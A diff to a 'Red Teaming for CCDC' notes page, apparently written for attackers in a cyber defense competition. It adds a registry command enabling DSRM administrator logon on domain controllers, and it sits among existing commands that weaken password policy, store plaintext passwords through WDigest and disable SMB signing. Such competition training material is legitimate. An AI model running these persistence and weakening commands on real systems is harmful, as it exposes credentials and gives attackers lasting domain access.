@@ -139,6 +139,8 @@ pagetitle: Red Teaming for CCDC
 - Allow old passwords for 5 days: `Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "OldPasswordAllowedPeriod" -Value 7200 -Type DWord`
 - Make password policy terrible: `Set-ADDefaultDomainPasswordPolicy -Identity (Get-ADDomain).DistinguishedName -MinPasswordLength 1 -PasswordHistoryCount 0 -ComplexityEnabled $false -MaxPasswordAge "999.00:00:00" -MinPasswordAge "0.00:00:00" -LockoutThreshold 0`
 - Store plaintext password with WDigest: `Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1 -Type DWord`
+- Allow DSRM account logon at all times: `Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2`
+  - This makes the DC accept the local SAM hash for the Administrator user, just specify user as `{DC_name}/User`
 
 **Make Services Worse**
 - Disable SMB Signing: `Set-SmbServerConfiguration -RequireSecuritySignature $false -EnableSecuritySignature $false -Force`
